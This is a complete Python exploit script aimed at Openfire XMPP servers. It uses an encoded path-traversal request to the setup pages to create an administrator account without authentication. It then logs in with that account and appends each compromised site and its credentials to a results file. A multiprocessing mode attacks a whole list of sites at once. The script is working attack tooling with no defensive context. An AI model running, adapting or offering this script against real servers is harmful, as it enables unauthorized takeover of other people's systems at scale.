import random
import string
import HackRequests
import os
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from multiprocessing import Pool
from optparse import OptionParser


class OpenfireExploit:
    def __init__(self, site: str):
        self.site = site

        self.username = ''.join(random.choice(
            string.ascii_lowercase + string.digits) for _ in range(6))
        self.password = ''.join(random.choice(
            string.ascii_lowercase + string.digits) for _ in range(6))

        self.host = urlparse(self.site).netloc
        self.run()

    @property
    def session(self):
        hackrequest = HackRequests.hackRequests()
        return hackrequest

    def run(self):
        try:
            # looping 2 times for the process, to ensure csrf has been initialized

            for i in range(2):
                csrf = self.getCsrf()
                if not csrf:
                    print('[-] cant get jsession / csrf : ', self.site)
                    return

                jsessionid, csrf = csrf
                login = False
                if self.createuser(jsessionid, csrf):
                    if self.login():
                        login = True
                        return
                else:
                    print('[-] cant create user : ', self.site)
                if not login:
                    print('[-] cant login : ', self.site)

        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print('[e]', e)

    def login(self):
        csrf = self.getCsrfLogin()
        if not csrf:
            print('[-] cant get csrf login : ', self.site)
            return False

        jsessionid, csrf = csrf

        login_url = f'{self.site}/login.jsp'

        # initiate data

        data = {}
        data['url'] = '/index.jsp'
        data['login'] = 'true'
        data['csrf'] = csrf
        data['password'] = self.password
        data['username'] = self.username

        headers = {
            'Cookie': f'JSESSIONID={jsessionid}; csrf={csrf}'
        }
        headers['Host'] = self.site.split('://')[1]
        headers['Origin'] = self.site
        headers['Referer'] = login_url

        response = self.session.http(login_url, post=data, headers=headers)
        soup = BeautifulSoup(response.text(), 'html.parser')
        error_message = [x.text or '' for x in soup.find_all(
            'td', {'class': 'jive-error-text'})]
        if len(error_message) < 3:
            print('[+] logged in to the dashboard ', self.site)
            open('results.txt', 'a').write(
                f'{self.site} {self.username} {self.password}\n')
            return True

    def getCsrfLogin(self):
        login_url = f'{self.site}/login.jsp?url=%2findex.jsp'
        response = self.session.http(login_url)
        csrf = response.cookies.get('csrf')
        jsessionid = response.cookies.get('JSESSIONID')
        return jsessionid, csrf

    def createuser(self, jsessionid, csrf):
        base_url = f'{self.site}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={self.username}&name=&email=&password={self.password}&passwordConfirm={self.password}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7'

        headers = {
            'Cookie': f'JSESSIONID={jsessionid}; csrf={csrf}',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",

        }

        response = self.session.http(base_url, headers=headers)
        return response.status_code == 200

    def getCsrf(self):
        """
        function to getcsrf for create user
        """
        base_url = f'{self.site}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp'
        response = self.session.http(
            base_url, headers={'User-Agent': 'Mozilla/5.0 Firefox abies'})

        # validating jssession id and csrf
        jsessionid = response.cookies.get('JSESSIONID') or None
        csrf = response.cookies.get('csrf') or None

        if not jsessionid or not csrf:
            return False
        return jsessionid, csrf


def format_url(url):
    url = url.rstrip()
    if "://" not in url:
        url = 'http://' + url
    return url


def validate(option):
    if option.url:
        url = format_url(option.url)
        return OpenfireExploit(url)

    if option.weblist and os.path.exists(option.weblist):
        lines = [format_url(_.rstrip()) for _ in open(
            option.weblist, 'r', errors='ignore').readlines()]
        with Pool(option.process) as process:
            process.map(OpenfireExploit, lines)
    return


def main():
    parser = OptionParser()
    parser.add_option(
        '-u', '--url', help="url target", action='store', type=str, metavar="http://127.0.0.1:9090")

    parser.add_option(
        '--web-list', help="Scan bulk target from txt", action="store", type=str, dest="weblist", metavar="sites.txt")
    parser.add_option('-p', '--process', help="Process to use",
                      default=10, action="store", type=int, metavar=10)

    (option, args) = parser.parse_args()
    if not option.url and not option.weblist:
        return parser.print_help()

    validate(option)


if __name__ == '__main__':
    main()
